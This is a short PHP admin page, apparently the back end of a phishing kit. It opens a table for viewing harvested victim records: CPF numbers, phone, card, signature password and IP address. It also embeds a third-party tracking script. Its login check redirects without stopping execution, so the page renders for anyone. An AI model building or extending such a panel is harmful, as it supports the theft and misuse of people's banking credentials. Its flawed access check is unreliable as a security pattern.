<?php

error_reporting(0);

session_start();
if (!isset($_SESSION['user']) || !isset($_SESSION['pass'])) {
	setcookie('msg','<center>Voce deve logar-se primeiro',time()+1);
	header('Location: admin_tela.php');
}

if (@$_GET['action'] == 'sair') {
	session_destroy();
	header('Location: admin_tela.php');
}

?>





<style>
BODY {
background-color : black;
}
</style>



<head>



<meta charset="utf-8">



</head>

<center>

<!-- Codigo contadorsite.com ver. 4.3 -->
<script language="javascript" src="http://aux01.contadorsite.com/hitv4.php?digit=fdg&page=f8879688f5d3f92dc297562226149a36&t=1507221885"></script>
<!-- FIN Codigo contadorsite.com -->

<br><br>
</center>

<br>

<center><a href="data_base2.php"> Tabelas </a></center>
<center><a href="logout.php"> Sair </a></center>

<br>

<table border="2" style="width:100%">

<tr><td><font color='red' size='5'>CPF</font></td><td><font color='red' size='5'>ENTRADA</font></td><td><font color='red' size='5'>CELULAR</font></td><td><font color='red' size='5'>CARTAO</font></td><td><font color='red' size='5'>ASSINATURA</font></td><td><font color='red' size='5'>DATA</font></td><td><font color='red' size='5'>IP</font></td></tr>


